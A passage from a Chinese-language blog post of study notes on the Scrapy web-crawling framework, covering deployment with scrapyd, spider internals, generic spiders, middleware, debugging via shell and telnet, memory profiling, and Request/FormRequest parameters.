TARGET<br> --egg=FILE            use the given egg, instead of building it<br> --build-egg=FILE      only build the egg, don&#x27;t deploy it<br><br><br></code></pre></td></tr></table></figure><ul><li><p>使用scrapy-deploy 来提交一个项目</p></li><li><p>提交格式scrapyd-deploy 服务器名字 -p 项目名称</p></li><li><p>在提交之前需要修改scrapy项目的scrapy.cfg配置文件</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cfg">[deploy:demo(服务器名字)]<br>url = http://localhost:6800/<br>project = chinanews_cawler(爬虫项目名)<br>目前为止我没血密码<br>#username = <br>#password = <br>#version = HG或者Git<br></code></pre></td></tr></table></figure><ul><li><p>使用scrapyd-deploy -l可以查询全部部署目标</p></li><li><p>使用scrapyd-deploy -l example 可以查看具体的部署目标</p></li></ul><h2 id="深入了解spider"><a href="#深入了解spider" class="headerlink" title="深入了解spider"></a>深入了解spider</h2><ul><li>查看spider源码发现,初始化函数直接检查name和start_urls是否存在不存在就报错</li><li>初始化spider后并不会调用爬虫而是使用start_requests才开始爬虫,在scrapy2.3.0中通过method_is_overridden来检查子类中是否重写了make_requests_from_url方法如果重写就提示这个函数即将废用如果没有重写就循环调用Request()来创建出多个请求</li><li>如果想要自己实现start_requests,(比如想要一开始先登录在执行爬取就可以将该方法修改位POST请求)通过重写的方式来进行修改这里第三个方法给予一个实例</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, **kwargs</span>):<br>       <span class="hljs-keyword">if</span> name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>           self.name = name<br>       <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">getattr</span>(self, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-literal">None</span>):<br>           <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;%s must have a name&quot;</span> % <span class="hljs-built_in">type</span>(self).__name__)<br>       self.__dict__.update(kwargs)<br>       <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self, <span class="hljs-string">&#x27;start_urls&#x27;</span>):<br>           self.start_urls = []<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">start_requests</span>(<span class="hljs-params">self</span>):<br>       cls = self.__class__<br>       <span class="hljs-keyword">if</span> method_is_overridden(cls, Spider, <span class="hljs-string">&#x27;make_requests_from_url&#x27;</span>):<br>           warnings.warn(<br>               <span class="hljs-string">&quot;Spider.make_requests_from_url method is deprecated; it &quot;</span><br>               <span class="hljs-string">&quot;won&#x27;t be called in future Scrapy releases. Please &quot;</span><br>               <span class="hljs-string">&quot;override Spider.start_requests method instead (see %s.%s).&quot;</span> % (<br>                   cls.__module__, cls.__name__<br>               ),<br>           )<br>           <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> self.start_urls:<br>               <span class="hljs-keyword">yield</span> self.make_requests_from_url(url)<br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> self.start_urls:<br>               <span class="hljs-keyword">yield</span> Request(url, dont_filter=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#重写函数实现用POST方法来请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_requests</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> [scrapy.FormRequest(<span class="hljs-string">&#x27;http:www.example.com/login&#x27;</span>,formata=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:name,<span class="hljs-string">&#x27;pass&#x27;</span>:secret&#125;,callback=self.logged_in)]<br></code></pre></td></tr></table></figure><hr><h3 id="包scrapy-spider-Spider"><a href="#包scrapy-spider-Spider" class="headerlink" title="包scrapy.spider.Spider"></a>包scrapy.spider.Spider</h3><ul><li>​name(唯一,重要属性用来定位spider)</li><li>​allowed_domains(可选,用来指示爬取域名范围)</li><li>​start_urls(没有特定指定的URL时默认采取的爬取地址)</li><li>​start_requests()[返回一个可迭代对象]</li><li>​parse(response)</li><li>​closed(reason)</li></ul><hr><h3 id="通用spider"><a href="#通用spider" class="headerlink" title="通用spider"></a>通用spider</h3><p>​特点:</p><ul><li>爬取大量网站</li><li>不会将整个网站都爬取完毕</li><li>逻辑非常简单</li><li>并行爬取大量网站以避免被某个网站限制爬取速度</li></ul><p>Scrapy提供了4个通用爬虫他们都是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#XMLFeedSpider--用于爬取符合XML文档的基类;</span><br><br><br>scrapy genspider -t xmlfeed myxmlspider sina.com.cn<br><br>    <br><span class="hljs-number">1.</span>必须继承iterator(枚举)属性,指明时针对文档的根节点还是针对指定节点进行搜索<br><span class="hljs-number">2.</span>不需要重写parse方法,而是重写parse_node.XMLFeedSpider按照itertag属性中指定的标签筛选出节点的集合,然后之一调用parse_node方法并将该节点作为处理参数传入<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">可重写的参数有个</span><br><span class="hljs-string">iterator--用于声明枚举类型.可选值为iternodes、xml、html</span><br><span class="hljs-string">iternodes:使用的是正则来迭代器</span><br><span class="hljs-string">xml:使用select的选择器,该迭代器采用了DOM来进行分析,在运行是需要将所有的DOM加载完毕才能执行对于大数据量是</span><br><span class="hljs-string">html:和xml一样</span><br><span class="hljs-string">itertag--用于指定筛选那些xml标签，默认为item</span><br><span class="hljs-string">在爬取的xml文档中从itertag指定的节点中开始</span><br><span class="hljs-string">namespaces--具有特殊命名空间的xml文档可以通过此元组属性指定。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>XMLFeedSpider内部集成了XPath会针对itertag进行访问并将结果返回到parse_node<br>由于HTML5的大量应用而且html5也严格遵从xml,因此用XMLFeedSpider来爬取是很好的选择<br><br><br><span class="hljs-comment">#CSVFeedSpider--用于爬取CSV文件的蜘蛛</span><br>采用三个属性来调节<br>    delimiter 设置每行字段值间的分割符设置为<span class="hljs-literal">None</span>采用<span class="hljs-string">&quot;,&quot;</span>作为分隔符<br>    quotechar设置采用的引号<br>    headers在CSV文件中包含的用来提取字段的名称列表<br>    在parse_row(response,row):<br>        可以采取row[<span class="hljs-string">&#x27;字符值&#x27;</span>]来获取返回的CSV中的值<br><span class="hljs-comment">#CrawlSpider--用于进行间接递进爬取的蜘蛛</span><br>rules = &#123;爬取规则&#125;内部采用Rule()构造对象<br>    Rule(self, link_extractor, callback=<span class="hljs-literal">None</span>, cb_kwargs=<span class="hljs-literal">None</span>, follow=<span class="hljs-literal">None</span>, process_links=<span class="hljs-literal">None</span>, process_request=identity)<br>    link_extractor链接提取器(现在一般都是LinkExtractor)<br>    callback回调函数<br>    cb_kwargs=给回调函数的字典<br>    follow是否从response中提取的链接进行跟进<br>    process_links从链接提取器中获取列表时会调用<br>    process_request该规则提取每个request会调用该函数<br>    <br><span class="hljs-comment">#SitemapSpider--从Sitemap.xml文件跟随进入网站进行深度爬网的蜘蛛</span><br>基本没用因为现在要爬的网站几乎都不提供<br>stiemap_urls包含要爬取的URL的Sitemap的URL列表(<span class="hljs-built_in">list</span>),也可以指定为一个robots.txt,Spider会从中分析URL<br>    sitemap_rules正则<br>    sitemap_follow跟进正则列表<br>    siteamp_alternate_links可选的链接(比如一个网站有英语版)<br>    例如:<br>            &lt;url&gt;<br>            &lt;loc&gt;http://example.com&lt;/loc&gt;<br>                &lt;xhtml:link rel=<span class="hljs-string">&quot;alternate&quot;</span> hreflang=<span class="hljs-string">&quot;de&quot;</span> href=<span class="hljs-string">&quot;http://example.com/de/&quot;</span>&gt;<br>            &lt;/url&gt;<br>对于这样的链接如果关闭siteamp_alternate_links就不获取<br></code></pre></td></tr></table></figure><p>看网上:</p><p><a href="https://www.cnblogs.com/xieqiankun/p/know_middleware_of_scrapy_1.html">https://www.cnblogs.com/xieqiankun/p/know_middleware_of_scrapy_1.html</a></p><p>这个网址介绍了如何使用中间件如何修改代理ip,UA,Cookie</p><p>测试网址IP代理<a href="http://exercise.kingname.info/exercise_middleware_ip">http://exercise.kingname.info/exercise_middleware_ip</a></p><p>测试UA<a href="http://exercise.kingname.info/exercise_middleware_ua%E3%80%82">http://exercise.kingname.info/exercise_middleware_ua。</a></p><p>测试Cookie<a href="http://exercise.kingname.info/exercise_login_success">http://exercise.kingname.info/exercise_login_success</a></p><p>1.定义一:更换代理IP，更换Cookies，更换User-Agent，自动重试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.process_spider_input当response经过中间件时调用处理response,</span><br><span class="hljs-comment">#返回异常(不会调用其他中间件的process_spider_input)或者None(继续处理)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_spider_input</span>(<span class="hljs-params">self, response, spider</span>):<br>        <span class="hljs-comment"># Called for each response that goes through the spider</span><br>        <span class="hljs-comment"># middleware and into the spider.</span><br>        <span class="hljs-comment"># Should return None or raise an exception.</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-comment">#2.当process_spider_input抛出异常时调用</span><br><span class="hljs-comment">#当返回None则Scrapy继续处理异常,当所有的中间件的process_spider_exception都经过到达引擎异常将被忽视和记录</span><br><span class="hljs-comment">#返回一个可迭代对象,中间链的process_spider_output其他的process_spider_exception</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_spider_exception</span>(<span class="hljs-params">self, response, exception, spider</span>):<br>        <span class="hljs-comment"># Called when a spider or process_spider_input() method</span><br>        <span class="hljs-comment"># (from other spider middleware) raises an exception.</span><br><br>        <span class="hljs-comment"># Should return either None or an iterable of Response, dict</span><br>        <span class="hljs-comment"># or Item objects.</span><br>        <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><p>2.scrapy内置中间件参考:</p><p>​DepthMiddleware用于跟踪request在被爬取的网站中的深度的中间件,用来限制深度</p><p>​DEPTH_LIMIT允许的最大深度</p><p>​DEPTH＿STATS获取爬取状态</p><p>​DEPTH＿PRIORITY根据深度获取request状态</p><p>​HttpErrorMiddleware决定处理其他的错误状态码200~300是成功的</p><p>​可以通过handle_httpstatus_list属性或HTTPERROR_ALLOWED_CODES来指定处理那些Spider的response返回值</p><p>​也可以用Request.meta[‘handle_httpstatus_list’]</p><p>​OffsiteMiddleware过滤所有主机名不在Spider属性allowed_domains属性，即使该request的网站不在允许列表里，offsite中间件也会允许该request</p><p>​RefererMiddleware根据request的response的URL来设置request_referer</p><p>​UrlLengthMiddleware过滤出URL长度比URLLENGTH_LIMIT设置的request对象</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>​@url url</p><p>​@returns item(s)|request(s) [min [max]] 设置返回spider的items和requests的上界和下界</p><p>​@scrapes field_1 field_2 …  检查字段中是否存在</p><p>​自定义Contracts</p><hr><p>​需要开启SPIDER_CONTRACTS{</p><p>​“路径”:优先级,</p><p>​}</p><p>​需要覆盖Contract(method,<em>args</em>)</p><p>​method关联的回调函数</p><p>​args—-docstring的argument列表</p><p>​需要覆盖</p><p>​adjust_request_args(args)一个字典包含了所有request对象参数的默认值</p><p>​pre_process(response):—–该函数在sample request接收到response后,传送给回调函数前被调用</p><p>​post_process(output):——-该函数处理回调函数的输出迭代器在传输的时候会被序列化</p><p>​scrapy check -l用来测试contract</p><h2 id="运行时调试"><a href="#运行时调试" class="headerlink" title="运行时调试"></a>运行时调试</h2><p>​使用scrapy parse –spider&#x3D;&#x3D;项目名 -c 自定义的Item -d 深度 <item_url></item_url></p><p>​–verbose或-v查看各层的状态</p><p>​检查单个start_url</p><p>​在浏览器中打开当前爬取的结果</p><h2 id="用shell来调试"><a href="#用shell来调试" class="headerlink" title="用shell来调试"></a>用shell来调试</h2><p>​scrapy shell <url></url></p><ul><li>shelp()打印可用对象以及快捷命令</li><li>fetch(request_or_url) 根据参数来获取response并更新相关类</li><li>view(response)在本机的浏览器打开给定response,会在response的body中添加一个<base>使得外部链接能正确显示。</li></ul><p>可用的scrapy对象</p><p>​crawler当前的crawler对象</p><p>​spider处理url的spider</p><p>​request最近获取到的页面的request对象。可以使用replace(),或者使用fetch快捷方式获取request</p><p>​sel获取最近的response构建的Selector</p><p>​settings返回一个settings</p><p>​inspect_response(response,self)加入断点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#开启</span><br>scrapy shell www.baidu.com<br><span class="hljs-comment">#抓取</span><br>fetch(&lt;url&gt;)<br><span class="hljs-comment">#提取数据</span><br>response.body<span class="hljs-comment">#爬取的网页</span><br></code></pre></td></tr></table></figure><h2 id="使用telnet和Guppy来进行内存调试"><a href="#使用telnet和Guppy来进行内存调试" class="headerlink" title="使用telnet和Guppy来进行内存调试"></a>使用telnet和Guppy来进行内存调试</h2><ul><li><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>官方文档<a href="https://doc.scrapy.org/en/latest/topics/telnetconsole.html">https://doc.scrapy.org/en/latest/topics/telnetconsole.html</a></p><p>首先需要在开启爬虫的情况下,来运行</p></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean">TELNETCONSOLE_USERNAME = <span class="hljs-string">&quot;YH&quot;</span><br>TELNETCONSOLE_PASSWORD = <span class="hljs-string">&quot;123456&quot;</span><br>在settings.py中可以设置用户名和密码<br><br>在cmd中使用telnet localhost <span class="hljs-number">6023</span>来链接<br>est()快速查看状态<br>engine.pause()暂停<br>engine.unpause()恢复<br>engine.stop()停止<br><br>Telnet 终端信号<br>scrapy.telnet.update_telnet_vars(telnet_vars)<br>prefs()用来查看每个的活动状态<br><br><br>用来查看当前最老的HtmlResponse是哪一个url导致的<br>    &gt;&gt;&gt; <span class="hljs-keyword">from</span> scrapy.utils.trackref <span class="hljs-keyword">import</span> get_oldest<br>    &gt;&gt;&gt; r = get_oldest(<span class="hljs-string">&#x27;HtmlResponse&#x27;</span>)<br>    &gt;&gt;&gt; r.url<br>    <span class="hljs-string">&#x27;http://www.somenastyspider.com/product.php?pid=123&#x27;</span><br>    <br>    遍历所有的HtmlResponse<br>    &gt;&gt;&gt; <span class="hljs-keyword">from</span> scrapy.utils.trackref <span class="hljs-keyword">import</span> iter_all<br>    &gt;&gt;&gt; [r.url for r <span class="hljs-keyword">in</span> iter_all(<span class="hljs-string">&#x27;HtmlResponse&#x27;</span>)]<br>    [<span class="hljs-string">&#x27;http://www.somenastyspider.com/product.php?pid=123&#x27;</span>,<br>     <span class="hljs-string">&#x27;http://www.somenastyspider.com/product.php?pid=584&#x27;</span>,<br>    ...]<br>    <br></code></pre></td></tr></table></figure><ul><li><h3 id="Guppy"><a href="#Guppy" class="headerlink" title="Guppy"></a>Guppy</h3><p>可以使用setuptools的easy_install来安装</p><p>对于Telnet终端提供了快捷方式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#需要用pip install guppy来安装<br>&gt;&gt;&gt; x = hpy.heap()<br>&gt;&gt;&gt; x.bytype<br>Partition of a <span class="hljs-built_in">set</span> of <span class="hljs-number">297033</span> objects. Total size = <span class="hljs-number">52587824</span> bytes.<br> Index  Count   %     Size   % Cumulative  % <span class="hljs-built_in">Type</span><br>     <span class="hljs-number">0</span>  <span class="hljs-number">22307</span>   <span class="hljs-number">8</span> <span class="hljs-number">16423880</span>  <span class="hljs-number">31</span>  <span class="hljs-number">16423880</span>  <span class="hljs-number">31</span> dict<br>     <span class="hljs-number">1</span> <span class="hljs-number">122285</span>  <span class="hljs-number">41</span> <span class="hljs-number">12441544</span>  <span class="hljs-number">24</span>  <span class="hljs-number">28865424</span>  <span class="hljs-number">55</span> str<br>     <span class="hljs-number">2</span>  <span class="hljs-number">68346</span>  <span class="hljs-number">23</span>  <span class="hljs-number">5966696</span>  <span class="hljs-number">11</span>  <span class="hljs-number">34832120</span>  <span class="hljs-number">66</span> tuple<br>     <span class="hljs-number">3</span>    <span class="hljs-number">227</span>   <span class="hljs-number">0</span>  <span class="hljs-number">5836528</span>  <span class="hljs-number">11</span>  <span class="hljs-number">40668648</span>  <span class="hljs-number">77</span> unicode<br>     <span class="hljs-number">4</span>   <span class="hljs-number">2461</span>   <span class="hljs-number">1</span>  <span class="hljs-number">2222272</span>   <span class="hljs-number">4</span>  <span class="hljs-number">42890920</span>  <span class="hljs-number">82</span> <span class="hljs-built_in">type</span><br>     <span class="hljs-number">5</span>  <span class="hljs-number">16870</span>   <span class="hljs-number">6</span>  <span class="hljs-number">2024400</span>   <span class="hljs-number">4</span>  <span class="hljs-number">44915320</span>  <span class="hljs-number">85</span> function<br>     <span class="hljs-number">6</span>  <span class="hljs-number">13949</span>   <span class="hljs-number">5</span>  <span class="hljs-number">1673880</span>   <span class="hljs-number">3</span>  <span class="hljs-number">46589200</span>  <span class="hljs-number">89</span> types.CodeType<br>     <span class="hljs-number">7</span>  <span class="hljs-number">13422</span>   <span class="hljs-number">5</span>  <span class="hljs-number">1653104</span>   <span class="hljs-number">3</span>  <span class="hljs-number">48242304</span>  <span class="hljs-number">92</span> list<br>     <span class="hljs-number">8</span>   <span class="hljs-number">3735</span>   <span class="hljs-number">1</span>  <span class="hljs-number">1173680</span>   <span class="hljs-number">2</span>  <span class="hljs-number">49415984</span>  <span class="hljs-number">94</span> _sre.SRE_Pattern<br>     <span class="hljs-number">9</span>   <span class="hljs-number">1209</span>   <span class="hljs-number">0</span>   <span class="hljs-number">456936</span>   <span class="hljs-number">1</span>  <span class="hljs-number">49872920</span>  <span class="hljs-number">95</span> scrapy.http.headers.Headers<br>&lt;<span class="hljs-number">1676</span> <span class="hljs-built_in">more</span> rows. <span class="hljs-built_in">Type</span> e.g. &#x27;_.<span class="hljs-built_in">more</span>&#x27; to view.&gt;<br></code></pre></td></tr></table></figure></li><li><h3 id="muppy"><a href="#muppy" class="headerlink" title="muppy"></a>muppy</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs coq">pip install Pympler<br>下面是一个使用muppy查看堆中所有可用python对象的示例：<br><br>&gt;&gt;&gt; from pympler import muppy<br>&gt;&gt;&gt; all_objects = muppy.get_objects()<br>&gt;&gt;&gt; len(all_objects)<br><span class="hljs-number">28667</span><br>&gt;&gt;&gt; from pympler import summary<br>&gt;&gt;&gt; suml = summary.summarize(all_objects)<br>&gt;&gt;&gt; summary.print_(suml)<br>                               types |   <span class="hljs-type"># objects</span> |   <span class="hljs-type">total</span> size<br>==================================== | <span class="hljs-type">=========== | ============</span><br><span class="hljs-type">                         &lt;class</span> &#x27;str |        <span class="hljs-type">9822</span> |      <span class="hljs-type">1</span><span class="hljs-number">.10</span> MB<br>                        &lt;class &#x27;dict |        <span class="hljs-type">1658</span> |    <span class="hljs-type">856</span><span class="hljs-number">.62</span> KB<br>                        &lt;class &#x27;type |         <span class="hljs-type">436</span> |    <span class="hljs-type">443</span><span class="hljs-number">.60</span> KB<br>                        &lt;class &#x27;code |        <span class="hljs-type">2974</span> |    <span class="hljs-type">419</span><span class="hljs-number">.56</span> KB<br>          &lt;class &#x27;_io.BufferedWriter |           <span class="hljs-type">2</span> |    <span class="hljs-type">256</span><span class="hljs-number">.34</span> KB<br>                         &lt;class &#x27;<span class="hljs-built_in">set</span> |         <span class="hljs-type">420</span> |    <span class="hljs-type">159</span><span class="hljs-number">.88</span> KB<br>          &lt;class &#x27;_io.BufferedReader |           <span class="hljs-type">1</span> |    <span class="hljs-type">128</span><span class="hljs-number">.17</span> KB<br>          &lt;class &#x27;wrapper_descriptor |        <span class="hljs-type">1130</span> |     <span class="hljs-type">88</span><span class="hljs-number">.28</span> KB<br>                       &lt;class &#x27;tuple |        <span class="hljs-type">1304</span> |     <span class="hljs-type">86</span><span class="hljs-number">.57</span> KB<br>                     &lt;class &#x27;weakref |        <span class="hljs-type">1013</span> |     <span class="hljs-type">79</span><span class="hljs-number">.14</span> KB<br>  &lt;class &#x27;builtin_function_or_method |         <span class="hljs-type">958</span> |     <span class="hljs-type">67</span><span class="hljs-number">.36</span> KB<br>           &lt;class &#x27;method_descriptor |         <span class="hljs-type">865</span> |     <span class="hljs-type">60</span><span class="hljs-number">.82</span> KB<br>                 &lt;class &#x27;abc.ABCMeta |          <span class="hljs-type">62</span> |     <span class="hljs-type">59</span><span class="hljs-number">.96</span> KB<br>                        &lt;class &#x27;list |         <span class="hljs-type">446</span> |     <span class="hljs-type">58</span><span class="hljs-number">.52</span> KB<br>                         &lt;class &#x27;int |        <span class="hljs-type">1425</span> |     <span class="hljs-type">43</span><span class="hljs-number">.20</span> KB<br></code></pre></td></tr></table></figure></li></ul><h2 id="HTTP的解析"><a href="#HTTP的解析" class="headerlink" title="HTTP的解析"></a>HTTP的解析</h2><ol><li>请求方法<ul><li>Get 是一种只读行为</li><li>Post 在URL上发布指定新信息。并且服务器确保数据已经被存储一次</li><li>Put 类似Post可能触发多次存储过程类似一种“更新”行为</li><li>DELETE 删除给定为止的信息</li><li>HEAD 服务器获取信息，但是只关心消息头，服务器会向Get一样来处理它，Get延申</li><li>Options 给客户端提供一个便捷的途径来弄清这个URL支持那些HTTP方法，Get延申</li></ul></li></ol><p>|———————-</p><p>以上的方法对应requests包</p><p>比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    r = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;http://httpbin.org/html&quot;</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br>    r = requests.post(<span class="hljs-string">&quot;http://httpbin.org/html&quot;</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br>    r = requests.delete(<span class="hljs-string">&quot;http://httpbin.org/html&quot;</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br>    r = requests.head(<span class="hljs-string">&quot;http://httpbin.org/html&quot;</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br>    r = requests.options(<span class="hljs-string">&quot;http://httpbin.org/html&quot;</span>)<br>    <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>|———————-</p><p>参数化页面</p><p>​带有查询字符串</p><p>​http：&#x2F;&#x2F;。。。。。。？参数</p><p>​路由</p><p>​http：&#x2F;&#x2F;。。。。。。&#x2F;asdf-asd-zzzz-asdfa.html</p><p>​提交表单</p><p>​http请求头解析:<a href="https://www.cnblogs.com/wanghuaqiang/p/12093563.html">https://www.cnblogs.com/wanghuaqiang/p/12093563.html</a></p><h2 id="Request对象"><a href="#Request对象" class="headerlink" title="Request对象"></a>Request对象</h2><p>​构造参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url, callback=<span class="hljs-literal">None</span>, method=<span class="hljs-string">&#x27;GET&#x27;</span>, headers=<span class="hljs-literal">None</span>, body=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">             cookies=<span class="hljs-literal">None</span>, meta=<span class="hljs-literal">None</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, priority=<span class="hljs-number">0</span>,</span><br><span class="hljs-params">             dont_filter=<span class="hljs-literal">False</span>, errback=<span class="hljs-literal">None</span>, flags=<span class="hljs-literal">None</span></span>):<br></code></pre></td></tr></table></figure><p>url:要请求的url</p><table><thead><tr><th align="left">参数</th><th>作用</th></tr></thead><tbody><tr><td align="left">callback</td><td>请求成功后调用指定的参数并返回response,如果没有指定默认反调用parse函数</td></tr><tr><td align="left">method</td><td>请求方式例如:”GET”</td></tr><tr><td align="left">body</td><td></td></tr><tr><td align="left">headers</td><td>请求头</td></tr><tr><td align="left">cookies</td><td>传递一个字典或者传递一个字典列表</td></tr><tr><td align="left">meta</td><td>可以存储数据或者对request功能的扩展</td></tr><tr><td align="left">encoding</td><td>编码格式</td></tr><tr><td align="left">priority</td><td>优先级</td></tr><tr><td align="left">dont_filter</td><td>禁止使用单击的方式提交</td></tr><tr><td align="left">errback</td><td>处理异常要调用的函数</td></tr></tbody></table><h4 id="meta的特殊扩展"><a href="#meta的特殊扩展" class="headerlink" title="meta的特殊扩展"></a>meta的特殊扩展</h4><p>​dont_redirect:遇到304是否重定向</p><p>​dont_retry:是否不要执行错误重试</p><p>​handle_httpstatus_list:处理HTTP状态码列表</p><p>​dont_merge_cookies:是否不要合并Cookies</p><p>​cookiesjar:存储cookies</p><p>​redirect_urls:重定向URL列表</p><p>​bindaddress:用指定的IP作为请求地址              </p><h3 id="FormRequest对象"><a href="#FormRequest对象" class="headerlink" title="FormRequest对象"></a>FormRequest对象</h3><p>​继承于Request对象用于处理表单元素</p><p>​class scrapy.http.FormRequest(url,[,formdata,….]):构造函数</p><p>​formdata接收一个字典</p><p>​FormRequest提供了一个非常有用的类方法from_response,可以通过返回的response来对表单进行预填充并返回FormRequest不过这个方法会将”提交”转换为”单击”,对于JavaScript渲染网页可能无法”单击”,可以将dont_filter设置为true来禁止单击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 